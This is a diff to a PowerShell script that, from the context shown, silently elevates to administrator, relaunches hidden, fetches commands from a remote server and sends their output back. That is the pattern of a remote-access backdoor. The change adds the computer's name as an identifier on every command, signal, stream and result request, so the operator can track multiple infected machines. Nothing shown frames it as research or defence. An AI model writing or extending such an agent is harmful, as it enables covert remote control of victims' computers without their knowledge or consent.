@@ -5,6 +5,7 @@ $retryCount = 0
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
+$clientId = $env:COMPUTERNAME  # unique identifier sent to server on every request
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -70,22 +71,22 @@ function Send-Http {
 }
 
 function Get-Command-From-Server {
-    try { return Send-Http -Url "$cfHost/cmd" } catch { throw $_ }
+    try { return Send-Http -Url "$cfHost/cmd?id=$clientId" } catch { throw $_ }
 }
 
 function Get-Signal-From-Server {
-    try { return Send-Http -Url "$cfHost/signal" -TimeoutMs 3000 } catch { return "" }
+    try { return Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000 } catch { return "" }
 }
 
 function Send-Stream-To-Server {
     param([string]$Body)
-    try { Send-Http -Url "$cfHost/stream" -Method "POST" -Body $Body | Out-Null }
+    try { Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null }
     catch { Write-Log "Stream send failed: $($_.Exception.Message)" "WARN" }
 }
 
 function Send-Result-To-Server {
     param([string]$Body)
-    try { Send-Http -Url "$cfHost/result" -Method "POST" -Body $Body | Out-Null }
+    try { Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null }
     catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
 }
 
